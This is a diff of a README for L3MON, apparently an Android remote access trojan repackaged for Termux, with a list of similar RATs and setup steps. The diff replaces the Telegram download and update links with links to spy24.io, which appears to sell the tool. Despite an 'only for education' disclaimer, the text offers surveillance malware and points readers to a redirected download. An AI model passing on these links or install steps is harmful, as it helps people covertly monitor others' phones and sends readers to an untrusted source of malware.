@@ -1,6 +1,5 @@
-# Deleted by owner it may not work, Get Updates on <a href="https://t.me/efxtv">TELEGRAM (only for education)</a>.
+# Deleted by owner it may not work, Get Updates on <a href="[https://t.me/efxtv](https://spy24.io/l3mon-rat/)">SPY24 (only for education)</a>.
 <p align="center">
-<img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
 A cloud-based remote Android management suite, powered by NodeJS 
 </p>
 <p> We as <a href="https://www.youtube.com/c/EFXTVE">EFX Tv</a> do not pressurize the Lemon tool in any way. Our moral obligation is to send all types of rights and donations directly to the original crater. We sincerely thank you for allowing us to upload this tool to our GitHub. We have enabled Lemon to support termux with a few minor changes.</p>
@@ -29,7 +28,6 @@ A cloud-based remote Android management suite, powered by NodeJS
 - Dendroid
 - LizRAT
 - ShivaTheCreator
-- [Read more](https://github.com/efxtv/RATS/blob/main/README.md) 
 
 
 ## L3MON Features
@@ -78,7 +76,7 @@ A cloud-based remote Android management suite, powered by NodeJS
     - `npm audit fix`
     - `npm audit`
 
-4. Download and Extract the latest release from [HERE](https://t.me/etxtv)
+4. Download and Extract the latest release from [HERE](https://spy24.io/l3mon-rat/)
 
 5. In the extracted folder, run these commands
     - `npm install` <- install dependencies
